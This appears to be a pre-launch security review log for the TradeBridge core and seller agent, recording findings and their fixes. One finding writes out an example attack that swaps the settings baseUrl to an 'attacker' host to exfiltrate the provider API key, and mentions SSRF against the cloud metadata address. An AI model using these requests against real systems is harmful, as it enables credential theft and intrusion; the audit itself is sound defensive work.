# Sprint 9 — Security Review Findings

**Date:** 2026-07-18 · Pre-launch adversarial review of TradeBridge Core (Go/Fiber) + Seller Agent (Bun/TS), plus dependency audit. Read-only reviews by independent subagents; this doc records findings + dispositions.

**Bottom line:** No Critical. Two High (both in the Agent). Core had no Critical/High — tenant isolation, authZ, JWT confinement, injection, and all S8/S9 additions verified solid. Fixes for High + serious-Medium landed in Task 7 (see disposition per item).

## Agent (tradebridge-agent)

### HIGH-1 — S9 work-queue: unbounded `inflight` growth + permanent cursor stall on dead-letter/backpressure
`src/runtime.ts` (`processEvent` + `advanceCursor`). The S9 watermark fix leaves a dead-lettered (retries-exhausted) or backpressure-rejected entry `done:false` at the head forever, so `advanceCursor` never drains it: `inflight[]` grows unbounded (OOM) and the persisted cursor freezes permanently. A single deterministically-failing event, or a burst that trips backpressure once, degrades the agent into a self-sustaining DoS.
**Disposition: FIXED.** Dead-letter is now terminal — a persistently-failing event is durably recorded (dead-letter marker + loud alert) and its entry marked done so the FIFO drains and the cursor advances past it (not a silent drop: it's captured + alerted). Backpressure applies flow control (intake awaits a slot) rather than reject-dropping an unprocessed event. Regression tests added.

### HIGH-2 — Admin API fail-open when `DASHBOARD_PASSWORD` unset; `.env.example` omits security vars; env only warns
`src/auth/index.ts`, `src/env.ts`, `.env.example`. A self-hosted seller who copies `.env.example` (which lacks `DASHBOARD_PASSWORD`/`DASHBOARD_SESSION_SECRET`) and skips `NODE_ENV=production` gets a fully unauthenticated, internet-exposed admin API. (This live host is hardened — secrets set — but the shipped default posture is unsafe.)
**Disposition: FIXED.** `assertEnv` now fails closed (non-zero exit) when `DASHBOARD_PASSWORD` is unset in production; `.env.example` documents all security vars with a loud comment.

### MEDIUM — No role gate on `/admin/settings` + `/admin/channels` → member exfiltrates provider API key via `baseUrl` swap (SSRF)
A member-role token can `PUT /admin/settings/reasoning {baseUrl:"https://attacker"}` (key retained when omitted); the next reasoning call sends the decrypted provider key to the attacker. Also enables internal SSRF (169.254.169.254).
**Disposition: FIXED.** Settings/channels writes gated to `owner`; `baseUrl` rejects RFC-1918/link-local/metadata hosts unless an explicit `ALLOW_PRIVATE_LLM_ENDPOINTS` flag is set.

### MEDIUM — No outbound `fetch` timeouts → worker/queue starvation
`src/reasoning/provider.ts`, `embeddings.ts`, `src/core/*`. A hung endpoint parks queue workers; 3 hangs stall the whole queue.
**Disposition: FIXED.** Outbound calls wrapped in `AbortSignal.timeout(...)`; timeout treated as retryable.

### MEDIUM — Shared/dev-constant fallback secrets (session HMAC + at-rest enc key collapse to `AGENT_TOKEN` → public constant)
`src/auth/index.ts`, `src/settings/crypto.ts`. If auth is on but session/enc secrets unset, tokens are signed with a public constant (forgeable owner token) and "encrypted" keys are plaintext-equivalent.
**Disposition: FIXED.** Refuses to boot when session/enc secrets are missing or equal the dev constant while auth is enabled.

### LOW — 7-day non-revocable session tokens; pairing-code modulo bias.
**Disposition: DOCUMENTED / deferred** (impractical to exploit; note for a future auth-hardening pass).

## Core (tradebridge-core)

### MEDIUM — Company suspension does not stop the suspended company's agent from acting via the Gateway
`internal/gateway/gateway.go` `authenticate()` checks only credential status/secret/expiry, never the company's `status`/`deleted_at`. A suspended-for-abuse seller's agent keeps submitting/countering quotes. (DSR deletion revokes creds, so deleted is covered; suspension is not.)
**Disposition: FIXED.** `authenticate()` now loads the company gate and rejects suspended/deleted companies.

### MEDIUM — Public waitlist endpoint has no rate limit
`internal/waitlist/handler.go` / router. `POST /v1/waitlist` is unauthenticated and unlimited → abuse/DoS + table bloat.
**Disposition: FIXED.** A `KeyIP` fail-open limiter now guards the waitlist route (matches the known pre-launch follow-up).

### LOW — Authenticated supplier search + discovery facet counts don't exclude suspended/soft-deleted
`SearchSuppliers`, `DiscoverCategory/Verified/RatingFacets`. The public list already excludes them (Task 5); these paths were missed.
**Disposition: FIXED.** Same `status='active' AND deleted_at IS NULL` predicate added for consistency.

### LOW — Registration email enumeration (409 "email already registered")
**Disposition: DOCUMENTED / accepted** — common for B2B; login already uses a generic error. Revisit if enumeration becomes a concern.

### LOW — Invite token returned in the API response body (`identity` invite)
Goes only to the authorized owner/admin, but the secret then lives in client logs/history.
**Disposition: DEFERRED** — requires email delivery of invites (pre-launch follow-up); drop from the response when invite email ships.

## Dependencies

- **Core (Go):** `govulncheck` flags **GO-2026-5856** (crypto/tls Encrypted Client Hello privacy leak, stdlib, call-path present via outbound TLS) — fixed in **go1.26.5**; live builds on go1.26.4. **Disposition: OPS** — bump the Go toolchain to ≥1.26.5 and rebuild at next publish (not a source change). 1 imported + 1 required vuln are not on any call path.
- **Agent (Bun):** `npm audit` requires a lockfile (Bun project, no package-lock). Key deps (elysia 1.2.x, typeorm 0.3.20, sqlite3 6.0.1) have no known critical advisories at review time. **Disposition: MONITOR.**

## Verified solid (no action)

Core: tenant isolation (every `/v1/*` scoped to JWT `company_id`, id-only queries gated by ownership → 404 for non-parties); role gates (DSR delete owner+password, export owner/admin, billing/invite/agent-cred owner/admin); JWT HMAC-only confinement + separate company/admin secrets + admin scope claim + fail-closed admin realm; sqlc parameterization (no dynamic SQL); impersonation read-only enforcement can't reach the Gateway; S8 password-hash leak not regressed; S9 DSR export DTO strips hashes + per-company scoping; cache keys strictly per-company; Stripe webhook signature-verified; domain verification has no takeover; Gateway command isolation (`SellerCompanyID == agent.CompanyID` + matched-to-RFQ). Agent: admin guard has no encoded/case/dot-segment bypass; SQL parameterized; no secret echo (hasKey/last4 only, AES-256-GCM at rest); Telegram callbacks fail-closed on chat identity; SSE parsing defensive.
